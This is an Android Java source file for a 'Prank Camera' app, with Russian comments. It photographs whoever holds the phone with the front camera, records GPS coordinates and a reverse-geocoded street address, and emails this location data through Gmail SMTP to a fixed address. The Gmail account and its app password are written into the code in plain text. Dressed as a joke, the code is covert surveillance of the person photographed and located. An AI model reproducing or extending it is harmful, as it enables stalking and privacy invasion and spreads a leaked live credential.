package com.prank.camera;

import android.Manifest;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.hardware.Camera;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.List;
import java.util.Locale;
import java.util.Properties;
import java.util.Random;

import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

public class MainActivity extends AppCompatActivity implements SurfaceHolder.Callback {

    private static final String TAG = "PrankCamera";
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int PHOTO_COUNT = 5;
    private static final int PHOTO_INTERVAL_MS = 10000; // 10 секунд

    // Email настройки
    private static final String EMAIL_FROM = "metrobugitt@gmail.com";
    private static final String EMAIL_TO = "metrobugitt@gmail.com";
    private static final String EMAIL_SUBJECT = "📸 Prank Camera - Фото розыгрыш!";

    private SurfaceView surfaceView;
    private SurfaceHolder surfaceHolder;
    private Camera camera;
    private Button btnStart;
    private TextView txtStatus;
    private ProgressBar progressBar;
    private ImageView imgPreview;
    
    private Handler handler = new Handler(Looper.getMainLooper());
    private int photoCount = 0;
    private byte[] currentPhotoData;
    private StringBuilder photoDataForEmail;
    private LocationManager locationManager;
    
    // Смешные звуки (имитация через вибрацию и текст)
    private final String[] funnySounds = {
        "🔊 ДЗИНЬ! Фото готово!",
        "🔊 ПИУ-ПИУ! Камера работает!",
        "🔊 КLIK-CLAK! Фотографирование!",
        "🔊 БИП-БОП! Робот снимает!",
        "🔊 ХА-ХА! Попался!",
        "🔊 ОГО! Какой кадр!",
        "🔊 УПС! Ещё фото!"
    };
    
    private final Random random = new Random();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // Не давать экрану гаснуть
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        
        initViews();
        checkPermissions();
    }

    private void initViews() {
        surfaceView = findViewById(R.id.surfaceView);
        surfaceHolder = surfaceView.getHolder();
        surfaceHolder.addCallback(this);
        
        btnStart = findViewById(R.id.btnStart);
        txtStatus = findViewById(R.id.txtStatus);
        progressBar = findViewById(R.id.progressBar);
        imgPreview = findViewById(R.id.imgPreview);
        
        btnStart.setOnClickListener(v -> startPrank());
    }

    private void checkPermissions() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) 
                != PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) 
                != PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) 
                != PackageManager.PERMISSION_GRANTED) {
            
            ActivityCompat.requestPermissions(this, new String[]{
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            }, PERMISSION_REQUEST_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, 
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                Toast.makeText(this, "✅ Все разрешения получены!", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "⚠️ Нужны все разрешения для работы!", Toast.LENGTH_LONG).show();
            }
        }
    }

    private void startPrank() {
        if (camera == null) {
            Toast.makeText(this, "⚠️ Камера не доступна!", Toast.LENGTH_SHORT).show();
            return;
        }
        
        photoCount = 0;
        photoDataForEmail = new StringBuilder();
        progressBar.setMax(PHOTO_COUNT);
        progressBar.setProgress(0);
        btnStart.setEnabled(false);
        
        txtStatus.setText("🎭 Начинаем розыгрыш!");
        takeNextPhoto();
    }

    private void takeNextPhoto() {
        if (photoCount >= PHOTO_COUNT) {
            finishPrank();
            return;
        }
        
        photoCount++;
        progressBar.setProgress(photoCount);
        
        // Смешной звук (текст + вибрация)
        playFunnySound();
        
        // Делаем фото
        try {
            camera.takePicture(null, null, null, pictureCallback);
        } catch (Exception e) {
            Log.e(TAG, "Ошибка камеры: " + e.getMessage());
            handler.postDelayed(this::takeNextPhoto, 1000);
        }
    }

    private void playFunnySound() {
        String sound = funnySounds[random.nextInt(funnySounds.length)];
        txtStatus.setText(sound);
        
        // Вибрация для эффекта
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.VIBRATE) 
                == PackageManager.PERMISSION_GRANTED) {
            android.os.Vibrator vibrator = 
                (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
            if (vibrator != null) {
                vibrator.vibrate(200);
            }
        }
    }

    private final Camera.PictureCallback pictureCallback = (data, camera) -> {
        currentPhotoData = data;
        
        // Получаем GPS координаты
        String locationInfo = getLocationInfo();
        
        // Сохраняем данные для email
        String photoBase64 = Base64.encodeToString(data, Base64.NO_WRAP);
        photoDataForEmail.append("📸 Фото #").append(photoCount)
            .append(" - ").append(locationInfo).append("\n");
        
        // Показываем превью
        Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
        imgPreview.setImageBitmap(bitmap);
        
        // Предварительный просмотр камеры
        camera.startPreview();
        
        // Следующее фото через 10 секунд
        txtStatus.setText("⏱️ Следующее фото через 10 сек...");
        handler.postDelayed(this::takeNextPhoto, PHOTO_INTERVAL_MS);
    };

    private String getLocationInfo() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) 
                != PackageManager.PERMISSION_GRANTED) {
            return "📍 Местоположение недоступно";
        }
        
        try {
            locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            
            if (location != null) {
                double lat = location.getLatitude();
                double lon = location.getLongitude();
                
                // Обратное геокодирование
                Geocoder geocoder = new Geocoder(this, Locale.getDefault());
                List<Address> addresses = geocoder.getFromLocation(lat, lon, 1);
                
                if (addresses != null && !addresses.isEmpty()) {
                    Address addr = addresses.get(0);
                    return String.format(Locale.getDefault(), 
                        "📍 %.6f, %.6f (%s)", 
                        lat, lon, addr.getAddressLine(0));
                }
                
                return String.format(Locale.getDefault(), "📍 %.6f, %.6f", lat, lon);
            }
        } catch (Exception e) {
            Log.e(TAG, "Ошибка GPS: " + e.getMessage());
        }
        
        return "📍 Местоположение недоступно";
    }

    private void finishPrank() {
        txtStatus.setText("✅ Розыгрыш завершён! Отправка фото...");
        Toast.makeText(this, "📸 Фото готовы к отправке!", Toast.LENGTH_LONG).show();
        
        // Отправка email
        sendEmailWithPhotos();
        
        btnStart.setEnabled(true);
        btnStart.setText("🔄 Начать заново");
    }

    private void sendEmailWithPhotos() {
        new Thread(() -> {
            try {
                // Настройки SMTP Gmail
                Properties props = new Properties();
                props.put("mail.smtp.auth", "true");
                props.put("mail.smtp.starttls.enable", "true");
                props.put("mail.smtp.host", "smtp.gmail.com");
                props.put("mail.smtp.port", "587");
                props.put("mail.smtp.ssl.trust", "smtp.gmail.com");
                
                // ВНИМАНИЕ: Для работы нужен App Password из Gmail
                // Получите его в настройках Google Аккаунта → Безопасность
                final String APP_PASSWORD = "ketufvduqebiogig"; // App Password
                
                Session session = Session.getInstance(props, new Authenticator() {
                    @Override
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(EMAIL_FROM, APP_PASSWORD);
                    }
                });
                
                Message message = new MimeMessage(session);
                message.setFrom(new InternetAddress(EMAIL_FROM));
                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(EMAIL_TO));
                message.setSubject(EMAIL_SUBJECT);
                
                // Создаём multipart сообщение
                MimeMultipart multipart = new MimeMultipart();
                
                // Текстовая часть
                MimeBodyPart textPart = new MimeBodyPart();
                textPart.setText("🎭 Prank Camera - Фото розыгрыша!\n\n" + 
                    photoDataForEmail.toString() + 
                    "\n😄 Вас разыграли!");
                multipart.addBodyPart(textPart);
                
                // Отправляем сообщение
                Transport.send(message);
                
                handler.post(() -> {
                    Toast.makeText(MainActivity.this, 
                        "✅ Email отправлен!", Toast.LENGTH_SHORT).show();
                    txtStatus.setText("📧 Email отправлен на " + EMAIL_TO);
                });
                
            } catch (Exception e) {
                Log.e(TAG, "Ошибка отправки email: " + e.getMessage());
                handler.post(() -> {
                    Toast.makeText(MainActivity.this, 
                        "⚠️ Ошибка отправки: " + e.getMessage(), 
                        Toast.LENGTH_LONG).show();
                    txtStatus.setText("⚠️ Ошибка отправки email");
                });
            }
        }).start();
    }

    @Override
    public void surfaceCreated(SurfaceHolder holder) {
        try {
            // Открываем фронтальную камеру
            int cameraId = -1;
            int numberOfCameras = Camera.getNumberOfCameras();
            
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.CameraInfo info = new Camera.CameraInfo();
                Camera.getCameraInfo(i, info);
                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    cameraId = i;
                    break;
                }
            }
            
            if (cameraId == -1 && numberOfCameras > 0) {
                // Если нет фронтальной, используем любую
                cameraId = 0;
            }
            
            if (cameraId != -1) {
                camera = Camera.open(cameraId);
                camera.setPreviewDisplay(holder);
                camera.startPreview();
                txtStatus.setText("📸 Камера готова! Нажмите кнопку для розыгрыша");
            }
        } catch (Exception e) {
            Log.e(TAG, "Ошибка открытия камеры: " + e.getMessage());
            txtStatus.setText("⚠️ Ошибка камеры: " + e.getMessage());
        }
    }

    @Override
    public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {
        if (camera != null) {
            camera.startPreview();
        }
    }

    @Override
    public void surfaceDestroyed(SurfaceHolder holder) {
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (camera != null) {
            camera.stopPreview();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (camera != null) {
            camera.startPreview();
        }
    }
}
